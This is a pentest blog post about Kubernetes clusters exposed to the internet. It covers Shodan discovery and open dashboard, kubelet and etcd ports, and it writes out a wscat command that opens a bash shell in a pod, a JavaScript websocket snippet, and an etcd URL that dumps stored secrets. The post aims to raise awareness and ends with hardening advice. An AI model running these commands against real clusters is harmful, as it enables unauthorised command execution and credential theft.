---
layout: post
title:  "Kubernetes or KuberPwn"
date:   2018-03-13 13:49:33 +0000
tags: [SSL, pentest, redteam, blueteam]
---
![](/blog/assets/kubernetes.png)

Ever since that news story about Telsa’s cloud infrastructure being compromised and a bitcoin miner loaded on their Kubernetes estate. Netscylla was intrigued on how easy this could happen to any of our customers cloud estates. So we decided to do some OSINT (Open Source reconnaissance) and our own research.

Bug Hunting for Kubernetes
We can utilise Shodan and Censys to discover how many Kubernetes platforms are connected to the public Internet. After an initial 15,000+ results from our queries in January, after the news of the compromise we have seen these numbers drop to 12,597; So it looks like developer/administrators are now applying security controls to their accounts.

Locating Vulnerable Management Interfaces
Finding open management interfaces is as easy as querying Shodan/Censys for:
* KubernetesDashboard
* Kubernetes-master
* Kubernetes
* Kube

## The Common Vulnerabilities

### Unsecured Dashboards
* Port 10250/TCP Open
* Port 2379/TCP Open
* Unsecured dashboards
Are the graphical management interfaces which are the easiest to compromise, just click around the interface looking for storage links; You may be lucky enough to spot some credentials for an S3 bucket?

![](/blog/assets/kubernetes_2.png)

### 10250/TCP Management Port
The HTTPS service on 10250/TCP is the default management API interface for Kubernetes clusters. Not secured by default! This means that the developer/administrator is responsible for securing their services.

By abusing the API we can achieve low level command execution as noted previously by Alexander Urcioli and this stack overflow thread: https://stackoverflow.com/questions/44394839/kubernetes-exec-throw-the-websocket-api

In order to follow Alexander’s workflow you need to install wscat, for those not familiar with node the instructions are below:
```
apt-get update 
apt-get install -y npm 
ln -s /usr/bin/nodejs /usr/bin/node 
npm install -g n n stable 
npm install -g wscat
```
Then your free to execute a command structured as:
```
wscat -c "ws://<Kubernetes IP>:<API PORT>/api/v1/namespaces/ \ default/pods/<POD NAME>/exec?container=<DOCKER_NAME>&stdin=1& \ 
stdout=1&stderr=1&tty=1&command=<PAYLOAD_HERE>"
```
Example executed within AWS VPC:
```
wscat -c "ws://172.21.1.11:8080/api/v1/namespaces/default/pods/my-nginx-3855515330-l1uqk/exec?container=my-nginx&stdin=1&stdout=1&stderr=1&tty=1&command=%2Fbin%2Fbash"
```
And if you have already compromised a pod (by some other means), to attack another pod, you could simply use JavaScript:
```
<script type=”text/javascript”> 
angular.module(‘exampleApp’, [‘kubernetesUI’])
  .config(function(kubernetesContainerSocketProvider) {    
     kubernetesContainerSocketProvider.WebSocketFactory =   
      “CustomWebSockets”; }) .run(function($rootScope) 
{ 
$rootScope.baseUrl = “ws://<KUBERNETES IP>:<PORT>”; 
$rootScope.selfLink = “/api/v1/namespaces/default/pods/<POD_NAME>”; 
$rootScope.containerName = “<DOCKER_NAME>”; 
$rootScope.accessToken = “”; 
$rootScope.preventSocket = true; 
}) 
/* Our custom WebSocket factory adapts the url */ 
.factory(“CustomWebSockets”, function($rootScope) 
{ 
return function CustomWebSocket(url, protocols) 
{ 
url = $rootScope.baseUrl + url; 
if ($rootScope.accessToken) url += “&access_token=” + $rootScope.accessToken; 
return new WebSocket(url, protocols); 
}; 
}); 
</script>
```
### 2379/TCP Etcd Port
The HTTP service on 2379/TCP is the default etcd service for your Kubernets instance. The API interface is accessible and not secured by default!
* http://<kuberenets IP>:2379/v2/keys/?recursive=true
It’ll leak internal passwords, AWS keys, certificates, private keys, encryption keys and more…

## Conclusion
So don’t forget to read https://kubernetes.io/docs/admin/authentication and ensure that your management interfaces are not open to the would and would-be bitcoin miners looking for easy profit.

